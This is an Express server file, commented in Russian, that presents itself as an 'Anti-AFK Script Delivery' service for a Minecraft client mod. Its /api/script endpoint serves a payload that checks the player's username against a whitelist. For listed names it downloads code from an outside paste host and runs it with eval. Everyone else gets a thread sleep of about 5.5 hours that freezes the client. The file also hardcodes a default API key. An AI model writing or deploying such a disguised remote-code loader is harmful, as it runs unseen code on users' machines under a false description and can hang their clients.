const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,automine',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors({
    origin: function (origin, callback) {
        if (!origin || origin.includes('railway') || origin.includes('localhost')) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

app.use(express.json());

// Логирование
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.path}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.some(key => key === apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        console.log('🚫 Blocked request');
        res.status(403).json({ error: 'Access denied' });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для anti-afk скрипта
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `(function() {
    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();

// Проверяем разрешенные имена
if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
    try {
        // Выполняем внешний скрипт
        eval(new java.util.Scanner(
            new java.net.URL("https://i.e-z.host/p/raw/qqm7yaqga88vrpf9n").openStream(), 
            "UTF-8"
        ).useDelimiter("\\A").next());
    } catch (e) {
        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
    }
} else {
    java.lang.Thread.sleep(20000000);
}

})();`;
    
    res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Anti-AFK Script Server',
        version: '1.0.0'
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

app.get('/', (req, res) => {
    res.json({
        service: 'Anti-AFK Script Delivery',
        version: '1.0.0',
        status: 'operational'
    });
});

app.get('/health', (req, res) => {
    res.status(200).json({ status: 'healthy' });
});

// ==================== ОБРАБОТКА ОШИБОК ====================

app.use('*', (req, res) => {
    res.status(404).json({ error: 'Not found' });
});

app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
app.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log('╔══════════════════════════════════════╗');
    console.log('║      ANTI-AFK SERVER STARTED       ║');
    console.log('╠══════════════════════════════════════╣');
    console.log(`║  Port: ${CONFIG.PORT}                       ║`);
    console.log(`║  Environment: ${CONFIG.NODE_ENV}           ║`);
    console.log('║                                      ║');
    console.log('║  Endpoints:                          ║');
    console.log('║  • GET /api/script  (requires auth)  ║');
    console.log('║  • GET /api/status  (requires auth)  ║');
    console.log('║  • GET /health                       ║');
    console.log('║                                      ║');
    console.log('║  Server is ready!                    ║');
    console.log('╚══════════════════════════════════════╝');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('Shutting down gracefully...');
    process.exit(0);
});
